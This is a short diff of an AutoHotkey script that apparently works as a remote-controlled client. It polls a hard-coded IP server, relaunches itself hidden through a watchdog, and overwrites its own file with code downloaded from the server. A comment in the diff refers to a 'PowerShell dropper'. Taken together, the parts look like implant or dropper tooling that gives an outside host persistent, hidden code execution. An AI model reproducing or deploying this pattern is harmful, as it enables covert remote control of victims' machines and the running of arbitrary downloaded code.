@@ -5,7 +5,7 @@
 SetBatchLines, -1
 
 global LaptopID := "Hashad" 
-global Version := "1.3" 
+global Version := "1.2" 
 
 global Url := "http://136.119.161.133:5000" ;Production
 ;global Url := "http://127.0.0.1:5000" ;Developmental
@@ -31,7 +31,7 @@ Poll() {
 
 Watchdog:
     if ((A_TickCount - LastPing) > 120000) {
-        ; Safely restart using the portable interpreter path (Invisible)
+        ; Safely restart using the portable interpreter path
         Run, "%A_AhkPath%" "%A_ScriptFullPath%", , Hide
         ExitApp
     }
@@ -57,10 +57,13 @@ CheckState() {
                         if (updateReq.status == 200) {
                             newCode := updateReq.responseText
                             
-                            ; Safely injects the LaptopID using variables to completely avoid AHK parsing bugs
+                            ; We split the variable string so the PowerShell dropper doesn't accidentally destroy it!
                             q := Chr(34)
-                            searchPattern := "m)^global LaptopID := " . q . "[^" . q . "]+" . q
-                            replaceString := "global LaptopID := " . q . LaptopID . q
+                            partA := "global Laptop"
+                            partB := "ID := "
+                            
+                            searchPattern := "m)^" . partA . partB . q . "[^" . q . "]+" . q
+                            replaceString := partA . partB . q . LaptopID . q
                             newCode := RegExReplace(newCode, searchPattern, replaceString)
                             
                             file := FileOpen(A_ScriptFullPath, "w", "UTF-8")
